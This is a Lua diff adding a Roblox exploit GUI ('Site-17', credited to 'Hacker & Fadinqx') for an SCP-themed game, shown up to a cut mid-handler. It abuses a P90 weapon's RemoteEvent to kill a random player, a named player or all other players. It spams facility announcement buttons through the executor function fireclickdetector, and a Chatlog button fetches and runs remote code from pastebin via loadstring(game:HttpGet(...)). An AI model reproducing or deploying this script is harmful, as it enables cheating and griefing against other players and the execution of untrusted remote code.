@@ -1,0 +1,831 @@
+function RegenSSTGUI()
+-- Farewell Infortality.
+-- Version: 2.82
+-- Instances:
+local MainMenu = Instance.new("ScreenGui")
+local MainPart = Instance.new("Frame")
+local TopBar = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local Line01 = Instance.new("Frame")
+local Command = Instance.new("Frame")
+local Title_2 = Instance.new("Frame")
+local Command_Name = Instance.new("TextLabel")
+local Buttons = Instance.new("Frame")
+local On = Instance.new("TextButton")
+local Off = Instance.new("TextButton")
+local Announce = Instance.new("ScrollingFrame")
+local Spam = Instance.new("TextButton")
+local PlayOnce = Instance.new("TextButton")
+local SDelay = Instance.new("TextButton")
+local TextBox = Instance.new("TextBox")
+local Manual = Instance.new("TextButton")
+local Kill = Instance.new("ScrollingFrame")
+local Random = Instance.new("TextButton")
+local All = Instance.new("TextButton")
+local Player = Instance.new("TextButton")
+local TextBox_2 = Instance.new("TextBox")
+local TextLabel = Instance.new("TextLabel")
+local Nil = Instance.new("ScrollingFrame")
+local TextLabel_2 = Instance.new("TextLabel")
+local SCP = Instance.new("ScrollingFrame")
+local S096 = Instance.new("TextButton")
+local S049 = Instance.new("TextButton")
+local S106 = Instance.new("TextButton")
+local Line02 = Instance.new("Frame")
+local Credit = Instance.new("TextLabel")
+local ButtonList = Instance.new("ScrollingFrame")
+local Breach = Instance.new("TextButton")
+local UIGridLayout = Instance.new("UIGridLayout")
+local Blackout = Instance.new("TextButton")
+local HCZLock = Instance.new("TextButton")
+local MCZ = Instance.new("TextButton")
+local CI = Instance.new("TextButton")
+local Breach2 = Instance.new("TextButton")
+local Riot = Instance.new("TextButton")
+local NTF = Instance.new("TextButton")
+local Kill_2 = Instance.new("TextButton")
+local SCP_2 = Instance.new("TextButton")
+local LOG = Instance.new("TextButton")
+--Properties:
+MainMenu.Name = "Site17GUI"
+MainMenu.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+MainMenu.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+MainPart.Name = "MainPart"
+MainPart.Parent = MainMenu
+MainPart.BackgroundColor3 = Color3.new(0.172549, 0.243137, 0.313726)
+MainPart.BackgroundTransparency = 0.20000000298023
+MainPart.BorderColor3 = Color3.new(0.172549, 0.243137, 0.313726)
+MainPart.Position = UDim2.new(0.833825707, 0, 0.310055852, 0)
+MainPart.Size = UDim2.new(0, 189, 0, 337)
+
+TopBar.Name = "TopBar"
+TopBar.Parent = MainPart
+TopBar.BackgroundColor3 = Color3.new(0.584314, 0.647059, 0.65098)
+TopBar.BorderColor3 = Color3.new(0.584314, 0.647059, 0.65098)
+TopBar.Size = UDim2.new(0, 189, 0, 54)
+
+Title.Name = "Title"
+Title.Parent = TopBar
+Title.BackgroundColor3 = Color3.new(1, 1, 1)
+Title.BackgroundTransparency = 1
+Title.Size = UDim2.new(0, 189, 0, 54)
+Title.Font = Enum.Font.Code
+Title.Text = "Site-17"
+Title.TextColor3 = Color3.new(0.92549, 0.941177, 0.945098)
+Title.TextSize = 35
+Title.TextStrokeColor3 = Color3.new(0.92549, 0.941177, 0.945098)
+
+Line01.Name = "Line01"
+Line01.Parent = MainPart
+Line01.BackgroundColor3 = Color3.new(0.92549, 0.941177, 0.945098)
+Line01.BorderColor3 = Color3.new(0.92549, 0.941177, 0.945098)
+Line01.Position = UDim2.new(0, 0, 0.71216619, 0)
+Line01.Size = UDim2.new(0, 189, 0, 9)
+
+Command.Name = "Command"
+Command.Parent = MainPart
+Command.BackgroundColor3 = Color3.new(0.92549, 0.941177, 0.945098)
+Command.BackgroundTransparency = 1
+Command.BorderColor3 = Color3.new(0.92549, 0.941177, 0.945098)
+Command.Position = UDim2.new(0, 0, 0.160237387, 0)
+Command.Size = UDim2.new(0, 189, 0, 186)
+
+Title_2.Name = "Title"
+Title_2.Parent = Command
+Title_2.BackgroundColor3 = Color3.new(0.92549, 0.941177, 0.945098)
+Title_2.BorderColor3 = Color3.new(0.92549, 0.941177, 0.945098)
+Title_2.Position = UDim2.new(0, 0, 0.129032254, 0)
+Title_2.Size = UDim2.new(0, 189, 0, 48)
+
+Command_Name.Name = "Command_Name"
+Command_Name.Parent = Title_2
+Command_Name.BackgroundColor3 = Color3.new(1, 1, 1)
+Command_Name.BackgroundTransparency = 1
+Command_Name.BorderColor3 = Color3.new(1, 1, 1)
+Command_Name.Size = UDim2.new(0, 189, 0, 48)
+Command_Name.Font = Enum.Font.SciFi
+Command_Name.Text = "Command_Name"
+Command_Name.TextColor3 = Color3.new(0, 0, 0)
+Command_Name.TextSize = 14
+
+Buttons.Name = "Buttons"
+Buttons.Parent = Command
+Buttons.BackgroundColor3 = Color3.new(0.92549, 0.941177, 0.945098)
+Buttons.BackgroundTransparency = 1
+Buttons.BorderColor3 = Color3.new(0.92549, 0.941177, 0.945098)
+Buttons.Position = UDim2.new(0, 0, 0.387096763, 0)
+Buttons.Size = UDim2.new(0, 189, 0, 114)
+
+On.Name = "On"
+On.Parent = Buttons
+On.BackgroundColor3 = Color3.new(0.180392, 0.8, 0.443137)
+On.BorderColor3 = Color3.new(0.180392, 0.8, 0.443137)
+On.Size = UDim2.new(0, 95, 0, 52)
+On.Font = Enum.Font.ArialBold
+On.Text = "ON"
+On.TextColor3 = Color3.new(0, 0, 0)
+On.TextSize = 14
+
+Off.Name = "Off"
+Off.Parent = Buttons
+Off.BackgroundColor3 = Color3.new(0.905882, 0.298039, 0.235294)
+Off.BorderColor3 = Color3.new(0.905882, 0.298039, 0.235294)
+Off.Position = UDim2.new(0.502645493, 0, 0, 0)
+Off.Size = UDim2.new(0, 94, 0, 52)
+Off.Font = Enum.Font.ArialBold
+Off.Text = "OFF"
+Off.TextColor3 = Color3.new(0, 0, 0)
+Off.TextSize = 14
+
+Announce.Name = "Announce"
+Announce.Parent = Buttons
+Announce.BackgroundColor3 = Color3.new(0.741176, 0.764706, 0.780392)
+Announce.BorderColor3 = Color3.new(0.741176, 0.764706, 0.780392)
+Announce.Position = UDim2.new(0, 0, 0.456140339, 0)
+Announce.Size = UDim2.new(0, 189, 0, 62)
+Announce.Visible = false
+Announce.ScrollBarThickness = 0
+
+Spam.Name = "Spam"
+Spam.Parent = Announce
+Spam.BackgroundColor3 = Color3.new(0.752941, 0.223529, 0.168627)
+Spam.BorderColor3 = Color3.new(0.752941, 0.223529, 0.168627)
+Spam.Size = UDim2.new(0, 69, 0, 20)
+Spam.Font = Enum.Font.SourceSans
+Spam.Text = "Spam"
+Spam.TextColor3 = Color3.new(0, 0, 0)
+Spam.TextSize = 14
+
+PlayOnce.Name = "PlayOnce"
+PlayOnce.Parent = Announce
+PlayOnce.BackgroundColor3 = Color3.new(0.752941, 0.223529, 0.168627)
+PlayOnce.BorderColor3 = Color3.new(0.752941, 0.223529, 0.168627)
+PlayOnce.Position = UDim2.new(0.365079373, 0, 0, 0)
+PlayOnce.Size = UDim2.new(0, 69, 0, 20)
+PlayOnce.Font = Enum.Font.SourceSans
+PlayOnce.Text = "Play Once"
+PlayOnce.TextColor3 = Color3.new(0, 0, 0)
+PlayOnce.TextSize = 14
+
+SDelay.Name = "SDelay"
+SDelay.Parent = Announce
+SDelay.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+SDelay.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+SDelay.Position = UDim2.new(1.86264515e-09, 0, 0.184210524, 0)
+SDelay.Size = UDim2.new(0, 69, 0, 20)
+SDelay.Font = Enum.Font.SourceSans
+SDelay.Text = "Set Delay"
+SDelay.TextColor3 = Color3.new(0, 0, 0)
+SDelay.TextSize = 14
+
+TextBox.Parent = Announce
+TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
+TextBox.BorderColor3 = Color3.new(1, 1, 1)
+TextBox.Position = UDim2.new(0, 0, 0.100800775, 0)
+TextBox.Size = UDim2.new(0, 69, 0, 20)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.PlaceholderText = "Delay in Seconds"
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.new(0, 0, 0)
+TextBox.TextScaled = true
+TextBox.TextSize = 14
+TextBox.TextWrapped = true
+
+Manual.Name = "Manual"
+Manual.Parent = Announce
+Manual.BackgroundColor3 = Color3.new(0.752941, 0.223529, 0.168627)
+Manual.BorderColor3 = Color3.new(0.752941, 0.223529, 0.168627)
+Manual.Position = UDim2.new(0.730158746, 0, 0, 0)
+Manual.Size = UDim2.new(0, 51, 0, 20)
+Manual.Font = Enum.Font.SourceSans
+Manual.Text = "Manual"
+Manual.TextColor3 = Color3.new(0, 0, 0)
+Manual.TextSize = 14
+
+Kill.Name = "Kill"
+Kill.Parent = Buttons
+Kill.BackgroundColor3 = Color3.new(0.741176, 0.764706, 0.780392)
+Kill.BorderColor3 = Color3.new(0.741176, 0.764706, 0.780392)
+Kill.Position = UDim2.new(0, 0, 0.456140339, 0)
+Kill.Size = UDim2.new(0, 189, 0, 62)
+Kill.Visible = false
+Kill.ScrollBarThickness = 0
+
+Random.Name = "Random"
+Random.Parent = Kill
+Random.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+Random.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+Random.Size = UDim2.new(0, 69, 0, 20)
+Random.Font = Enum.Font.SourceSans
+Random.Text = "Random"
+Random.TextColor3 = Color3.new(0, 0, 0)
+Random.TextSize = 14
+
+All.Name = "All"
+All.Parent = Kill
+All.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+All.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+All.Position = UDim2.new(0.365079373, 0, 0, 0)
+All.Size = UDim2.new(0, 69, 0, 20)
+All.Font = Enum.Font.SourceSans
+All.Text = "All"
+All.TextColor3 = Color3.new(0, 0, 0)
+All.TextSize = 14
+
+Player.Name = "Player"
+Player.Parent = Kill
+Player.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+Player.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+Player.Position = UDim2.new(0, 0, 0.184210524, 0)
+Player.Size = UDim2.new(0, 69, 0, 20)
+Player.Font = Enum.Font.SourceSans
+Player.Text = "Player"
+Player.TextColor3 = Color3.new(0, 0, 0)
+Player.TextSize = 14
+
+TextBox_2.Parent = Kill
+TextBox_2.BackgroundColor3 = Color3.new(1, 1, 1)
+TextBox_2.BorderColor3 = Color3.new(1, 1, 1)
+TextBox_2.Position = UDim2.new(0, 0, 0.100800775, 0)
+TextBox_2.Size = UDim2.new(0, 69, 0, 20)
+TextBox_2.Font = Enum.Font.SourceSans
+TextBox_2.Text = ""
+TextBox_2.TextColor3 = Color3.new(0, 0, 0)
+TextBox_2.TextScaled = true
+TextBox_2.TextSize = 14
+TextBox_2.TextWrapped = true
+
+TextLabel.Parent = Kill
+TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel.BackgroundTransparency = 1
+TextLabel.Position = UDim2.new(0.428571403, 0, 0.0988360047, 0)
+TextLabel.Size = UDim2.new(0, 91, 0, 29)
+TextLabel.Font = Enum.Font.Code
+TextLabel.Text = "Mode: Random"
+TextLabel.TextColor3 = Color3.new(0, 0, 0)
+TextLabel.TextSize = 14
+
+Nil.Name = "Nil"
+Nil.Parent = Buttons
+Nil.BackgroundColor3 = Color3.new(0.741176, 0.764706, 0.780392)
+Nil.BorderColor3 = Color3.new(0.741176, 0.764706, 0.780392)
+Nil.Position = UDim2.new(0, 0, 0.456140339, 0)
+Nil.Size = UDim2.new(0, 189, 0, 62)
+Nil.ScrollBarThickness = 0
+
+TextLabel_2.Parent = Nil
+TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel_2.BackgroundTransparency = 1
+TextLabel_2.Position = UDim2.new(0.259259224, 0, 0.0681342483, 0)
+TextLabel_2.Size = UDim2.new(0, 91, 0, 29)
+TextLabel_2.Font = Enum.Font.Code
+TextLabel_2.Text = "No config avaliable"
+TextLabel_2.TextColor3 = Color3.new(0, 0, 0)
+TextLabel_2.TextSize = 14
+
+SCP.Name = "SCP"
+SCP.Parent = Buttons
+SCP.BackgroundColor3 = Color3.new(0.741176, 0.764706, 0.780392)
+SCP.BorderColor3 = Color3.new(0.741176, 0.764706, 0.780392)
+SCP.Position = UDim2.new(0, 0, 0.456140339, 0)
+SCP.Size = UDim2.new(0, 189, 0, 62)
+SCP.Visible = false
+SCP.ScrollBarThickness = 0
+
+S096.Name = "S096"
+S096.Parent = SCP
+S096.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+S096.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+S096.Size = UDim2.new(0, 69, 0, 20)
+S096.Font = Enum.Font.SourceSans
+S096.Text = "SCP-096"
+S096.TextColor3 = Color3.new(0, 0, 0)
+S096.TextSize = 14
+
+S049.Name = "S049"
+S049.Parent = SCP
+S049.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+S049.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+S049.Position = UDim2.new(0.365079373, 0, 0, 0)
+S049.Size = UDim2.new(0, 69, 0, 20)
+S049.Font = Enum.Font.SourceSans
+S049.Text = "SCP-049"
+S049.TextColor3 = Color3.new(0, 0, 0)
+S049.TextSize = 14
+
+S106.Name = "S106"
+S106.Parent = SCP
+S106.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+S106.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+S106.Position = UDim2.new(0.730158746, 0, 0, 0)
+S106.Size = UDim2.new(0, 51, 0, 20)
+S106.Font = Enum.Font.SourceSans
+S106.Text = "SCP-106"
+S106.TextColor3 = Color3.new(0, 0, 0)
+S106.TextSize = 14
+
+Line02.Name = "Line02"
+Line02.Parent = MainPart
+Line02.BackgroundColor3 = Color3.new(0.92549, 0.941177, 0.945098)
+Line02.BorderColor3 = Color3.new(0.92549, 0.941177, 0.945098)
+Line02.Position = UDim2.new(0, 0, 0.160237387, 0)
+Line02.Size = UDim2.new(0, 189, 0, 24)
+
+Credit.Name = "Credit"
+Credit.Parent = Line02
+Credit.BackgroundColor3 = Color3.new(1, 1, 1)
+Credit.BackgroundTransparency = 1
+Credit.Size = UDim2.new(0, 189, 0, 24)
+Credit.Font = Enum.Font.SourceSans
+Credit.Text = "Made by: Hacker & Fadinqx"
+Credit.TextColor3 = Color3.new(0.901961, 0.494118, 0.133333)
+Credit.TextSize = 14
+Credit.TextStrokeColor3 = Color3.new(0.901961, 0.494118, 0.133333)
+
+ButtonList.Name = "ButtonList"
+ButtonList.Parent = MainPart
+ButtonList.BackgroundColor3 = Color3.new(1, 1, 1)
+ButtonList.BorderColor3 = Color3.new(1, 1, 1)
+ButtonList.Position = UDim2.new(0, 0, 0.738872409, 0)
+ButtonList.Size = UDim2.new(0, 189, 0, 88)
+ButtonList.CanvasPosition = Vector2.new(0, 22)
+ButtonList.ScrollBarThickness = 0
+
+Breach.Name = "Breach"
+Breach.Parent = ButtonList
+Breach.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+Breach.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+Breach.Position = UDim2.new(0, 0, 0.725000024, 0)
+Breach.Size = UDim2.new(0, 63, 0, 22)
+Breach.Font = Enum.Font.Code
+Breach.Text = "Breach"
+Breach.TextColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+Breach.TextSize = 14
+Breach.TextStrokeColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+Breach.TextWrapped = true
+
+UIGridLayout.Parent = ButtonList
+UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIGridLayout.CellPadding = UDim2.new(0, 0, 0, 2)
+UIGridLayout.CellSize = UDim2.new(0, 63, 0, 22)
+
+Blackout.Name = "Blackout"
+Blackout.Parent = ButtonList
+Blackout.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+Blackout.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+Blackout.Position = UDim2.new(0, 0, 0.725000024, 0)
+Blackout.Size = UDim2.new(0, 63, 0, 22)
+Blackout.Font = Enum.Font.Code
+Blackout.Text = "Blackout"
+Blackout.TextColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+Blackout.TextSize = 14
+Blackout.TextStrokeColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+Blackout.TextWrapped = true
+
+HCZLock.Name = "HCZLock"
+HCZLock.Parent = ButtonList
+HCZLock.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+HCZLock.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+HCZLock.Position = UDim2.new(0, 0, 0.725000024, 0)
+HCZLock.Size = UDim2.new(0, 63, 0, 22)
+HCZLock.Font = Enum.Font.Code
+HCZLock.Text = "HCZLock"
+HCZLock.TextColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+HCZLock.TextSize = 14
+HCZLock.TextStrokeColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+HCZLock.TextWrapped = true
+
+MCZ.Name = "MCZ"
+MCZ.Parent = ButtonList
+MCZ.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+MCZ.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+MCZ.Position = UDim2.new(0, 0, 0.725000024, 0)
+MCZ.Size = UDim2.new(0, 63, 0, 22)
+MCZ.Font = Enum.Font.Code
+MCZ.Text = "MCZ"
+MCZ.TextColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+MCZ.TextSize = 14
+MCZ.TextStrokeColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+MCZ.TextWrapped = true
+
+CI.Name = "CI"
+CI.Parent = ButtonList
+CI.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+CI.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+CI.Position = UDim2.new(0, 0, 0.725000024, 0)
+CI.Size = UDim2.new(0, 63, 0, 22)
+CI.Font = Enum.Font.Code
+CI.Text = "CI"
+CI.TextColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+CI.TextSize = 14
+CI.TextStrokeColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+CI.TextWrapped = true
+
+Breach2.Name = "Breach2"
+Breach2.Parent = ButtonList
+Breach2.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+Breach2.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+Breach2.Position = UDim2.new(0, 0, 0.725000024, 0)
+Breach2.Size = UDim2.new(0, 63, 0, 22)
+Breach2.Font = Enum.Font.Code
+Breach2.Text = "Breach2"
+Breach2.TextColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+Breach2.TextSize = 14
+Breach2.TextStrokeColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+Breach2.TextWrapped = true
+
+Riot.Name = "Riot"
+Riot.Parent = ButtonList
+Riot.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+Riot.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+Riot.Position = UDim2.new(0, 0, 0.725000024, 0)
+Riot.Size = UDim2.new(0, 63, 0, 22)
+Riot.Font = Enum.Font.Code
+Riot.Text = "Riot"
+Riot.TextColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+Riot.TextSize = 14
+Riot.TextStrokeColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+Riot.TextWrapped = true
+
+NTF.Name = "NTF"
+NTF.Parent = ButtonList
+NTF.BackgroundColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+NTF.BorderColor3 = Color3.new(0.945098, 0.768628, 0.0588235)
+NTF.Position = UDim2.new(0, 0, 0.725000024, 0)
+NTF.Size = UDim2.new(0, 63, 0, 22)
+NTF.Font = Enum.Font.Code
+NTF.Text = "NTF"
+NTF.TextColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+NTF.TextSize = 14
+NTF.TextStrokeColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+NTF.TextWrapped = true
+
+Kill_2.Name = "Kill"
+Kill_2.Parent = ButtonList
+Kill_2.BackgroundColor3 = Color3.new(0.905882, 0.298039, 0.235294)
+Kill_2.BorderColor3 = Color3.new(0.905882, 0.298039, 0.235294)
+Kill_2.Position = UDim2.new(0, 0, 0.725000024, 0)
+Kill_2.Size = UDim2.new(0, 63, 0, 22)
+Kill_2.Font = Enum.Font.Code
+Kill_2.Text = "Kill"
+Kill_2.TextColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+Kill_2.TextSize = 14
+Kill_2.TextStrokeColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+
+SCP_2.Name = "SCP"
+SCP_2.Parent = ButtonList
+SCP_2.BackgroundColor3 = Color3.new(0.905882, 0.298039, 0.235294)
+SCP_2.BorderColor3 = Color3.new(0.905882, 0.298039, 0.235294)
+SCP_2.Position = UDim2.new(0, 0, 0.725000024, 0)
+SCP_2.Size = UDim2.new(0, 63, 0, 22)
+SCP_2.Font = Enum.Font.Code
+SCP_2.Text = "SCPmove"
+SCP_2.TextColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+SCP_2.TextSize = 14
+SCP_2.TextStrokeColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+
+LOG.Name = "LOG"
+LOG.Parent = ButtonList
+LOG.BackgroundColor3 = Color3.new(0.152941, 0.682353, 0.376471)
+LOG.BorderColor3 = Color3.new(0.152941, 0.682353, 0.376471)
+LOG.Position = UDim2.new(0, 0, 0.725000024, 0)
+LOG.Size = UDim2.new(0, 63, 0, 22)
+LOG.Font = Enum.Font.Code
+LOG.Text = "Chatlog"
+LOG.TextColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+LOG.TextSize = 14
+LOG.TextStrokeColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+-- Scripts:
+function SCRIPT_ZEDQ79_FAKESCRIPT() -- MainMenu.LocalScript 
+local script = Instance.new('LocalScript')
+script.Parent = MainMenu
+--this will provide your exploit with some functions that you can use to make it look more fleshed out.
+
+--shows up in chat
+--RGB should be an array
+function MSG(msg, RGB, font)
+local msg_color = Color3.fromRGB(RGB[1], RGB[2], RGB[3])
+
+game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
+       Text = msg;
+       Color = msg_color; -- {0-255, 0-255, 0-255}
+       Font = font; --Arcade, Cartoon, Arial, Legacy, ArialBold, Bodoni, Garamond, SciFi
+   })
+end
+
+function Notify(title,text,duration,icon,func,BTN,BTN2)
+
+game.StarterGui:SetCore("SendNotification", {Title=title,Text=text,Icon=icon,Duration=duration,Callback=func,Button1=BTN,Button2=BTN2})
+end
+
+
+Mbtns = {"Breach","Blackout","HCZLock","MCZ","CI","Breach2","Riot","NTF"}
+buttonList = {"ContainmentBreachAnnouncementButtons1","SiteBlackoutButtons","HCZLockdownButtons","MCZBreachAlarmButtons","ChaosInsurgencyBreachAlarmButtons","ContainmentBreachAnnouncementButtons2","ClassDRiotAnnouncementButtons","NineTailedFoxAnnouncementButtons"}
+Sbtns = {false,false,false,false,false,false,false,false}
+
+
+
+local Event = nil
+
+function Remotecheck()
+--expand to holding item
+if game.Players.LocalPlayer.Backpack:FindFirstChild("P90") == nil then
+Notify("ERROR","No P90 detected",1)
+return false
+else
+Event = game.Players.LocalPlayer.Backpack.P90.RemoteEvent
+return true
+end
+end
+
+function btn(d,m)
+fireclickdetector(game.workspace[m].play.ClickDetector)
+wait(d)
+fireclickdetector(game.workspace[m].stop.ClickDetector)
+wait(d) 
+end
+function play(m)
+fireclickdetector(game.workspace[m].play.ClickDetector)
+end
+function stop (m)
+fireclickdetector(game.workspace[m].stop.ClickDetector)
+end
+
+
+
+--kill rnd, all, target
+function Kill(plr)
+if Remotecheck() == false then
+return
+end
+local A_1 = "Fire"
+local A_2 = plr.Character["HumanoidRootPart"]
+for i=0, 25 do
+Event:FireServer(A_1, A_2)
+end
+end
+
+--button Vars
+local S173 = false
+local S049 = false
+local S106 = false
+
+
+local mode = "nil"
+--buttons
+com = script.Parent.MainPart.Command
+btns = script.Parent.MainPart.ButtonList
+--main
+com.Buttons.On.MouseButton1Click:connect(function()
+if mode == "Kill" then
+if KillRnd then
+t = game.Players:GetChildren()[math.random(#game.Players:GetChildren())]
+if t ~= game.Players.LocalPlayer then
+Kill(t)
+end
+end
+if KillAll then
+for index, child in pairs(game.Players:GetChildren()) do
+if child ~= game.Players.LocalPlayer then
+Kill(child)
+end
+end 
+end
+if KillTar then
+target = com.Buttons.Kill.TextBox.Text
+if game.Players:FindFirstChild(target) ~= nil then
+Kill(game.Players:FindFirstChild(target))
+else
+com.Buttons.Kill.TextBox.Text = "NOT FOUND"
+end
+
+end
+end
+
+for i,v in pairs(Mbtns) do
+if mode == v then
+if manual then
+play(buttonList[i])
+end
+if spam then
+spawn(function()
+while spam == true do
+wait(0.01)
+btn(globDelay,buttonList[i])
+end
+end)
+end
+if playOnce then
+if game:FindFirstChild(buttonList[i]):FindFirstChildOfClass("Sound") ~= nil then
+play(buttonList[i])
+wait(game:FindFirstChild(buttonList[i]):FindFirstChildOfClass("Sound").TimeLength)
+stop(buttonList[i])
+else
+play(buttonList[i])
+end
+end
+end
+end
+
+end)
+com.Buttons.Off.MouseButton1Click:connect(function()
+for i,v in pairs(Mbtns) do
+if mode == v then
+stop(buttonList[i])
+end
+end
+end)
+--red
+KillRnd = false
+KillAll = false
+KillTar = false
+spam = false
+globDelay = 1
+playOnce = false
+manual = true
+
+btns.Kill.MouseButton1Click:connect(function()
+mode = "Kill"
+com.Title.Command_Name.Text = "Kill"
+com.Buttons.Kill.Visible = true
+com.Buttons.Announce.Visible = false
+com.Buttons.Nil.Visible = false
+com.Buttons.SCP.Visible = false
+end)
+
+btns.SCP.MouseButton1Click:connect(function()
+mode = "SCP"
+com.Title.Command_Name.Text = "SCP move"
+com.Buttons.Kill.Visible = false
+com.Buttons.Announce.Visible = false
+com.Buttons.Nil.Visible = false
+com.Buttons.SCP.Visible = true
+end)
+
+com.Buttons.Kill.Player.MouseButton1Click:Connect(function()
+KillRnd = false
+KillTar = true
+KillAll = false
+com.Buttons.Kill.TextLabel.Text = "Mode:Player"
+end)
+
+com.Buttons.Kill.Random.MouseButton1Click:Connect(function()
+KillRnd = true
+KillTar = false
+KillAll = false
+com.Buttons.Kill.TextLabel.Text = "Mode:Random"
+end)
+
+com.Buttons.Kill.All.MouseButton1Click:Connect(function()
+KillRnd = false
+KillTar = false
+KillAll = true
+com.Buttons.Kill.TextLabel.Text = "Mode:All"
+end)
+
+--green
+
+--data
+local data
+function newFolder(n)
+f = Instance.new("Folder")
+f.Parent = data
+f.Name = n
+return f
+end
+
+function newEntry(p,t,s,d)
+v = Instance.new(t)
+v.Value = d
+v.Parent = p
+v.Name = s
+end
+
+
+--[[
+if game.ReplicatedStorage:FindFirstChild("S17D") == nil then
+data = Instance.new("Folder")
+data.Name = "S17D"
+data.Parent = game.ReplicatedStorage
+
+for i,v in pairs(Mbtns) do
+f = newFolder(v) --TimeLength
+--Instance.new()
+newEntry(f,"BoolValue","spam",false)
+newEntry(f,"BoolValue","on",false)
+newEntry(f,"BoolValue","playOnce",false)
+newEntry(f,"NumberValue","delay",1)
+--newEntry(f,"NumberValue","Length",game:FindFirstChild(buttonList[i]):FindFirstChildOfClass("Sound").TimeLength)
+end
+else
+data = game.ReplicatedStorage:FindFirstChild("S17D")
+end
+
+--]]
+
+--.MouseButton1Click:Connect(function()
+for i,v in pairs(Mbtns) do
+btns[v].MouseButton1Click:Connect(function()
+mode = v
+print(mode)
+com.Title.Command_Name.Text = mode
+
+com.Buttons.Kill.Visible = false
+com.Buttons.Announce.Visible = true
+com.Buttons.Nil.Visible = false
+com.Buttons.SCP.Visible = false
+end)
+end
+
+btns.LOG.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/mUDdJKTX", true))() --add credit notification (Could not find user)
+end)
+
+--on rgb(39, 174, 96)
+--off rgb(192, 57, 43)
+com.Buttons.Announce.Spam.MouseButton1Click:Connect(function()
+spam = true
+playOnce = false
+manual = false
+
+com.Buttons.Announce.Spam.BackgroundColor3 = Color3.fromRGB(39, 174, 96)
+com.Buttons.Announce.Spam.BorderColor3 = Color3.fromRGB(39, 174, 96)
+
+com.Buttons.Announce.PlayOnce.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
+com.Buttons.Announce.PlayOnce.BorderColor3 = Color3.fromRGB(192, 57, 43)
+
+com.Buttons.Announce.Manual.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
+com.Buttons.Announce.Manual.BorderColor3 = Color3.fromRGB(192, 57, 43)
+end)
+
+com.Buttons.Announce.PlayOnce.MouseButton1Click:Connect(function()
+spam = false
+playOnce = true
+manual = false
+
+com.Buttons.Announce.PlayOnce.BackgroundColor3 = Color3.fromRGB(39, 174, 96)
+com.Buttons.Announce.PlayOnce.BorderColor3 = Color3.fromRGB(39, 174, 96)
+
+com.Buttons.Announce.Spam.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
+com.Buttons.Announce.Spam.BorderColor3 = Color3.fromRGB(192, 57, 43)
+
+com.Buttons.Announce.Manual.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
+com.Buttons.Announce.Manual.BorderColor3 = Color3.fromRGB(192, 57, 43)
+end)
+
+com.Buttons.Announce.Manual.MouseButton1Click:Connect(function()
+spam = false
+playOnce = false
+manual = true
+
+com.Buttons.Announce.PlayOnce.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
